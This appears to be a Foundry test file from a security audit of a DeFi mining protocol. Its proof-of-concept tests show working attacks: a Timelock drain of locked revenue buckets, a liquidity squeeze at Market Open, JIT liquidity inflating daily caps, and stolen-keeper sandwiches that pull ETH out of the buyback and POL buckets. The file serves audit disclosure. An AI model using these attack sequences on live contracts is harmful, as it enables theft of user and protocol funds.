// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IAccessControl} from "@openzeppelin/contracts/access/IAccessControl.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";

import {MiningCore} from "../../src/MiningCore.sol";
import {RevenueRouter} from "../../src/RevenueRouter.sol";
import {BuybackBurner} from "../../src/BuybackBurner.sol";
import {MockAggregator} from "../../test/mocks/MockAggregator.sol";
import {AttackBase, PoolActorAttacker} from "./AttackBase.sol";

contract SelfDestructor {
    constructor() payable {}

    function boom(address payable to) external {
        selfdestruct(to);
    }
}

contract AttacksTest is AttackBase {
    using StateLibrary for IPoolManager;

    function setUp() public {
        _deploy();
        _prefill(10, "driller");
        vm.warp(MARKET_OPEN);
        _catchUp();
        _fresh();
    }

    // ================================================================= ATK-1
    /// lockBucketRoles makes LOCKED_ROLE the admin of the bucket roles, but LOCKED_ROLE's own
    /// admin is DEFAULT_ADMIN_ROLE (never changed). The 96 h Timelock grants itself LOCKED_ROLE
    /// and then rewires every "frozen" bucket role: it drains the POL and buyback buckets and can
    /// brick Market Open by revoking the LiquidityManager's POL_ROLE.
    function test_ATK1_timelockUnlocksFrozenBucketRoles() public {
        assertTrue(router.bucketRolesLocked());
        bytes32 locked = router.LOCKED_ROLE();
        assertEq(router.getRoleAdmin(router.POL_ROLE()), locked);
        // The hole: the admin of LOCKED_ROLE is DEFAULT_ADMIN_ROLE, held by the Timelock.
        assertEq(router.getRoleAdmin(locked), router.DEFAULT_ADMIN_ROLE());

        address thief = makeAddr("thief");
        uint256 pol = router.polBalance();
        uint256 buyback = router.buybackBalance();
        assertGt(pol, 0);
        assertGt(buyback, 0);

        vm.startPrank(admin); // one batched 96 h Timelock operation
        router.grantRole(locked, admin);
        router.grantRole(router.POL_ROLE(), thief);
        router.grantRole(router.BUYBACK_ROLE(), thief);
        router.revokeRole(router.POL_ROLE(), address(lm));
        vm.stopPrank();

        vm.startPrank(thief);
        router.pullPol(pol);
        router.pullBuyback(buyback);
        vm.stopPrank();
        assertEq(thief.balance, pol + buyback, "85 % of all fuel revenue redirected");
        console2.log("POL + buyback drained (wei):", pol + buyback);

        // Market Open is now impossible: the LiquidityManager lost POL_ROLE.
        vm.expectRevert();
        core.openMarket();
    }

    // ================================================================= ATK-2
    /// The refinery opens at the same timestamp as openMarket, and the Market Open LP is clamped
    /// to the room left in the shared hourly mint window. Refining the genesis credit first
    /// (a whale, or simply the launch rush) shrinks the protocol's locked liquidity.
    function test_ATK2_refineRushSqueezesMarketOpenLiquidity() public {
        uint256 snap = vm.snapshotState();
        uint256 polBefore = router.polBalance();
        uint256 lpHonest = _open();
        uint256 poolEthHonest = lm.poolEth();
        vm.revertToState(snap);

        // Same block, before openMarket: genesis miners fast-refine their credit.
        uint256 minted = _refineAll(drillers);
        uint256 lpSqueezed = _open(); // anyone may call it right after, atomically
        uint256 poolEthSqueezed = lm.poolEth();

        console2.log("LP honest (MOHN wei)     :", lpHonest);
        console2.log("LP after refine rush     :", lpSqueezed);
        console2.log("minted by refines        :", minted);
        console2.log("pool ETH honest / squeezed:", poolEthHonest, poolEthSqueezed);
        console2.log("POL ETH left in router   :", router.polBalance(), "of", polBefore);
        assertLt(lpSqueezed * 100, lpHonest * 70, "initial LP at least 30 % smaller");
        assertLt(
            poolEthSqueezed * 100, poolEthHonest * 70, "pool depth (and daily caps) 30 % smaller"
        );
    }

    /// With the fast-refine fee at its lower bound (0 %, a legal Timelock value) the squeeze
    /// reaches about 60 %.
    function test_ATK2b_squeezeWithZeroFastFee() public {
        vm.prank(admin);
        core.setParam(MiningCore.Param.FastRefineFee, 0);
        uint256 snap = vm.snapshotState();
        uint256 lpHonest = _open();
        vm.revertToState(snap);
        _refineAll(drillers);
        uint256 lpSqueezed = _open();
        console2.log("LP honest / squeezed:", lpHonest, lpSqueezed);
        assertLt(lpSqueezed * 100, lpHonest * 45, "initial LP more than 55 % smaller");
    }

    // ================================================================= ATK-3
    /// Extension of FINDINGS #12: the daily caps read the pool's ACTIVE liquidity valued as if it
    /// were full range. Concentrated liquidity in one tick spacing around the price inflates that
    /// reading many times over for little capital, which is returned in the same block. A stolen
    /// keeper key can therefore spend far more than "one day's capped buyback" at once.
    function test_ATK3_concentratedJitInflatesDailyCaps() public {
        _open();
        uint256 honestCap = (lm.poolEth() * 200) / 10_000;
        PoolActorAttacker jit = new PoolActorAttacker(pm);
        vm.deal(address(jit), 10 ether);
        // MOHN for the two-sided narrow position: a refined genesis balance.
        vm.startPrank(drillers[9]);
        core.refine(10_000e18, true);
        IERC20(address(mohn)).transfer(address(jit), 9_200e18);
        vm.stopPrank();
        uint256 ethStart = address(jit).balance;
        uint256 mohnStart = IERC20(address(mohn)).balanceOf(address(jit));

        (int24 lower, int24 upper, int256 liq) = _narrowRange(30);
        (int256 e, int256 m) = jit.modify(_key(), lower, upper, liq);
        uint256 inflatedCap = (lm.poolEth() * 200) / 10_000;
        console2.log("honest cap / inflated cap (wei):", honestCap, inflatedCap);
        console2.log("JIT capital ETH (wei):", uint256(-e));
        console2.log("JIT capital MOHN (wei):", uint256(-m));
        console2.log("pool ETH, honest reading (wei):", (honestCap * 10_000) / 200);
        assertGt(inflatedCap, honestCap * 20, "cap inflated more than 20x");

        // Compromised keeper spends 20 days' worth of cap in one call.
        uint256 spend = honestCap * 20;
        assertLe(spend, router.buybackBalance());
        vm.prank(keeper);
        bb.executeBuyback(spend, 1);
        assertEq(bb.spentInDay(), spend);

        // The JIT capital comes back in the same block.
        jit.modify(_key(), lower, upper, -liq);
        console2.log("JIT ETH  start/end:", ethStart, address(jit).balance);
        console2.log(
            "JIT MOHN start/end:", mohnStart, IERC20(address(mohn)).balanceOf(address(jit))
        );
        assertGt(address(jit).balance, ethStart, "the narrow position sold MOHN to the buyback");
    }

    /// Full sandwich by the holder of a stolen keeper key: buy MOHN, inflate the cap with a
    /// narrow JIT position, buyback with minOut = 1 far above the honest cap, unwind, sell.
    function test_ATK3b_stolenKeeperSandwichBeyondDocumentedBound() public {
        _open();
        PoolActorAttacker x = new PoolActorAttacker(pm);
        vm.deal(address(x), 10 ether);
        vm.startPrank(drillers[9]);
        core.refine(10_000e18, true);
        IERC20(address(mohn)).transfer(address(x), 9_200e18);
        vm.stopPrank();
        uint256 eth0 = address(x).balance;
        uint256 mohn0 = IERC20(address(mohn)).balanceOf(address(x));
        uint256 bucket0 = router.buybackBalance();

        // 1. front-run: buy MOHN with half the pool's ETH
        uint256 bought = uint256(x.swap(_key(), true, lm.poolEth() / 2));
        uint256 capAfterPump = (lm.poolEth() * 200) / 10_000;
        // 2. JIT narrow liquidity
        (int24 lower, int24 upper, int256 liq) = _narrowRange(40);
        x.modify(_key(), lower, upper, liq);
        // 3. keeper buys back half of the whole bucket at minOut = 1
        uint256 spend = bucket0 / 2;
        assertGt(spend, capAfterPump * 10, "10x more than even the pumped cap");
        vm.prank(keeper);
        bb.executeBuyback(spend, 1);
        // 4. unwind and sell back exactly the MOHN bought in step 1 plus whatever the JIT sold
        x.modify(_key(), lower, upper, -liq);
        uint256 mohnNow = IERC20(address(mohn)).balanceOf(address(x));
        x.swap(_key(), false, mohnNow - mohn0);
        uint256 eth1 = address(x).balance;
        assertEq(IERC20(address(mohn)).balanceOf(address(x)), mohn0, "same MOHN as at start");
        console2.log("bought in front-run (MOHN wei):", bought);
        console2.log("buyback spent (wei):", spend, "honest daily cap:", capAfterPump);
        console2.log("attacker ETH profit (wei):", eth1 - eth0);
        console2.log("profit as % of spend x100:", ((eth1 - eth0) * 10_000) / spend);
        assertGt(eth1, eth0 + spend / 2, "attacker extracts more than half of the buyback ETH");
    }

    /// Same against the POL bucket: addLiquidity's 4 % cap is inflated, the swapped half is
    /// sandwiched and the added half is put in at the pumped price.
    function test_ATK3c_stolenKeeperDrainsPolViaAddLiquidity() public {
        _open();
        for (uint256 i = 0; i < drillers.length; ++i) {
            vm.prank(drillers[i]);
            core.buyFuel{value: 0.01 ether}(address(0)); // post-open revenue: POL += 0.03 ETH
        }
        PoolActorAttacker x = new PoolActorAttacker(pm);
        vm.deal(address(x), 10 ether);
        vm.startPrank(drillers[9]);
        core.refine(10_000e18, true);
        IERC20(address(mohn)).transfer(address(x), 9_200e18);
        vm.stopPrank();
        uint256 eth0 = address(x).balance;
        uint256 mohn0 = IERC20(address(mohn)).balanceOf(address(x));
        uint256 honestCap = (lm.poolEth() * 400) / 10_000;

        x.swap(_key(), true, lm.poolEth() / 2);
        (int24 lower, int24 upper, int256 liq) = _narrowRange(40);
        x.modify(_key(), lower, upper, liq);
        uint256 spend = (lm.poolEth() * 400) / 10_000; // the inflated cap, all of it
        if (spend > router.polBalance()) spend = router.polBalance();
        vm.prank(keeper);
        lm.addLiquidity(spend, 1);
        x.modify(_key(), lower, upper, -liq);
        x.swap(_key(), false, IERC20(address(mohn)).balanceOf(address(x)) - mohn0);
        uint256 profit = address(x).balance - eth0;
        console2.log("POL spent (wei):", spend, "honest daily cap:", honestCap);
        console2.log("attacker ETH profit (wei):", profit);
        assertGt(spend, honestCap * 10, "10x the honest daily cap");
        assertGt(profit, spend / 10, "attacker extracts >10 % of the POL spent");
    }

    /// One tick spacing around the current tick, `mult` x the pool's active liquidity.
    function _narrowRange(uint256 mult)
        internal
        view
        returns (int24 lower, int24 upper, int256 liq)
    {
        int24 t = _tick();
        lower = (t / 60) * 60;
        if (t < 0 && t % 60 != 0) lower -= 60;
        upper = lower + 60;
        liq = int256(uint256(_poolLiquidity()) * mult);
    }

    function _poolLiquidity() internal view returns (uint128) {
        return pm.getLiquidity(_key().toId());
    }

    // ================================================================= ATK-4 (Info)
    /// Daily caps reset at the UTC day boundary, so 2 days of cap can be spent 1 second apart.
    function test_ATK4_dayBoundaryDoublesCap() public {
        _open();
        uint256 dayEnd = ((block.timestamp / 1 days) + 1) * 1 days;
        vm.warp(dayEnd - 1);
        uint256 cap = (lm.poolEth() * 200) / 10_000;
        vm.prank(keeper);
        bb.executeBuyback(cap, 1);
        vm.warp(dayEnd);
        uint256 cap2 = (lm.poolEth() * 200) / 10_000;
        vm.prank(keeper);
        bb.executeBuyback(cap2, 1);
        assertEq(bb.totalEthSpent(), cap + cap2);
        assertGt(cap + cap2, (cap * 19) / 10, "about 2 caps within 1 second");
    }

    // ================================================================= ATK-5 (Info)
    /// Refining opens at genesis + 72 h even before openMarket; tokens can trade on any other
    /// ETH/MOHN pool (other fee tier, no hook) initialized at an arbitrary price first.
    function test_ATK5_secondPoolBeforeMarketOpen() public {
        address d = drillers[0];
        vm.prank(d);
        core.refine(1000e18, true);
        assertFalse(core.marketOpened());
        PoolKey memory k = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(mohn)),
            fee: 500,
            tickSpacing: 10,
            hooks: IHooks(address(0))
        });
        // Arbitrary price: 1 ETH = 1 MOHN (orders of magnitude off P0).
        pm.initialize(k, TickMath.getSqrtPriceAtTick(0));
        PoolActorAttacker a = new PoolActorAttacker(pm);
        vm.deal(address(a), 1 ether);
        vm.prank(d);
        IERC20(address(mohn)).transfer(address(a), 900e18);
        a.modify(k, -1000, 1000, 1e19);
        assertGt(pm.getLiquidity(k.toId()), 0, "a market exists before Market Open");
    }

    // ================================================================= Info: R1 equality
    function test_INFO_forcedEthBreaksR1Equality() public {
        SelfDestructor s = new SelfDestructor{value: 1 ether}();
        s.boom(payable(address(router)));
        assertGt(
            address(router).balance,
            router.buybackBalance() + router.polBalance() + router.opsBalance(),
            "R1 '==' does not hold; only '>=' does"
        );
    }

    // ================================================================= Info: sequencer feed
    /// A Chainlink L2 uptime feed reports startedAt == 0 for an uninitialised round; the check
    /// `block.timestamp - startedAt <= SEQUENCER_GRACE` treats it as "up for 56 years".
    function test_INFO_sequencerStartedAtZeroAccepted() public {
        MockAggregator seq = new MockAggregator(0, 0);
        seq.set(0, 0, block.timestamp);
        vm.prank(admin);
        core.setSequencerFeed(address(seq));
        address p = makeAddr("newPlayer");
        vm.deal(p, 1 ether);
        vm.prank(p);
        core.buyFuel{value: 0.001 ether}(address(0)); // not rejected
    }
}
